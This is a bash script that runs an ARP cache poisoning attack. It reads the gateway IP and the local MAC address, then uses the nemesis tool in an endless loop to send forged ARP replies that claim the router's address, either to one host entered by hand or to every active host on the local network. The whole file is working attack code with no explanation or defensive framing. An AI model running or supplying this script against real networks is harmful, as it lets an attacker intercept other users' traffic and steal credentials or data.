#!/bin/bash

#Router IP Address
S=$(/usr/local/bin/nm-tool/usr/bin/nm-tool | grep -i gateway | xargs echo | cut -d ' ' -f2)
echo $S
#Fake Router MAC Address
h=$(/usr/local/bin/nm-tool/usr/bin/nm-tool | grep -i "HW Address" | xargs echo | cut -d ' ' -f3)
echo $h
single_host=false
while getopts "s" opt
do
	case $opt in
		s)
			single_host=true
			;;
	esac
done

if [ $single_host = true ]
then
	echo
	echo Enter Destination IP Address
	read D
	echo Enter Destination MAC Address
	read m

	while :
	do
		nemesis arp -r -S $S -D $D -h $h -m $m
		sleep 1
	done
	
else
	output=$( ./list_active_host.sh)
	address=($output)
	size=${#address[@]}
	while :
	do
		for (( i=0; i<size-1; i+=2 ))
		do
			ip=${address[i]}
			mac=${address[i+1]}
			echo $ip $mac
			nemesis arp -r -S $S -D $ip -h $h -m $mac
		done
		sleep 1
	done
fi
